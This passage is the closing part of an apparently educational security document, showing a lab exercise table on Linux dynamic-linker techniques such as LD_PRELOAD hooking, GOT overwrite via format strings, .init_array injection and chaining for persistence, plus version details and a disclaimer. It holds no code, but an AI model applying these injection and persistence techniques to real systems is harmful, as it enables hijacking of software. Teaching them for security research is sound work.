│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 12.3 Lab Exercises

| Exercise | Technique | Difficulty |
|----------|-----------|------------|
| 1 | Create LD_PRELOAD library that hooks `getenv()` | Easy |
| 2 | Patch binary with patchelf to add DT_NEEDED | Easy |
| 3 | Implement GOT overwrite via format string | Medium |
| 4 | Create LD_AUDIT library that logs all symbol bindings | Medium |
| 5 | Inject code into .init_array via binary patching | Medium |
| 6 | Create IFUNC-based pre-main code execution | Hard |
| 7 | Chain LD_PRELOAD + GOT overwrite for persistence | Hard |

---

**Document Version:** 1.0
**Last Updated:** 2025-12-21
**Classification:** Educational / Security Research

---

*This document is for educational purposes only. The techniques described should only be used in authorized security research, penetration testing, or educational environments.*
